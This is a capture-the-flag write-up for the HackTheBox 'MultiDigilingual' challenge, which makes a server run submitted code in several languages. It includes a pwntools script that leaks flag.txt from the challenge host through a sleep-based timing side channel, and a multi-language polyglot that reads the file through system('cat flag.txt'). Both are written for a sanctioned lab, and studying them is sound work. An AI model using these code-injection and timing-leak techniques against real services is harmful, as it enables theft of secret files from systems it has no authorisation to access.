# MultiDigilingual

## Solution 1 (unintended?)
Accessing the challenge, we get clear instructions. We somehow need to develop a single program that will run code in 6 different languages.  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/db857144-6fcd-422c-84fa-ac7271c7d4ab)

A simple python code to open and read the flag works and then it goes to try and execute perl and fails. That's normal given that I have only provided python code.

Seeing that python code gets executed first, let's abuse that and get the flag out character by character. If the flag contains HTB, sleep 1, add the valid character to the list, if it contains HTB{ sleep 1, add the valid character to the list etc. Standard bruteforcing, slow but doable:  

```python3
from pwn import *
import base64
import time
import string
import warnings
warnings.filterwarnings('ignore')

chars = string.ascii_letters + string.digits + '_}'
flag = ''
found_curly_brace = False

while not found_curly_brace:
    for c in chars:
        python_code = '''
import time

with open('flag.txt') as fp:
    result = fp.read()
    print(result)
    if 'HTB{%s' in result:
        time.sleep(1)
        ''' % (flag + c)

        r = remote('94.237.62.241', 57116)
        start_time = time.time()
        r.recvuntil('languages: ')
        payload = base64.b64encode(python_code.encode())
        r.sendline(payload)
        r.recvall()
        end_time = time.time()
        elapsed_time = end_time - start_time

        if elapsed_time > 1:
            print('HTB{' + (flag+c))
            flag += c
            if c == '}':
                found_curly_brace = True  
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/51e04b62-56cd-4d8b-818d-ed75a5dbf12a)

Since it's slow, we leave this running and focus on other challenges or grab a beer and we get the flag... eventually:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0f78ded7-601c-4b12-b9d6-80857f5bd29d)

## Solution 2

The smarter solution is to use a `polyglot` because after all, that's exactly what they are describing. Google searching a perl python polyglot, the first result mentions some of the other languages we need to run code for as well:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/290c7e86-38ca-43df-bd2a-ae5f06f1bc63)

[This](https://github.com/floyd-fuh/C-CPP-Perl-Ruby-Python-Polyglot) seems to be exactly what the challenge expects us to provide but we are missing PHP from the lot, so we modify the code to look something like this:  

```c
#define a "cat flag.txt"
#define b "cat flag.txt"
#include/*
q="""*/<stdlib.h>
int main(){if(sizeof('C') - 1) system(a);
    else   {system(b);}} /*=;
print(`cat flag.txt`)#";puts File.read('flag.txt')#";<?=$f=file_get_contents('flag.txt');#""";print(open('flag.txt').read())#*/
```
We base64 encode that and pass it and get the flag via the intended way:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/b6d4e3fd-d364-459f-aa3c-a50bb33cca0f)

`HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5}`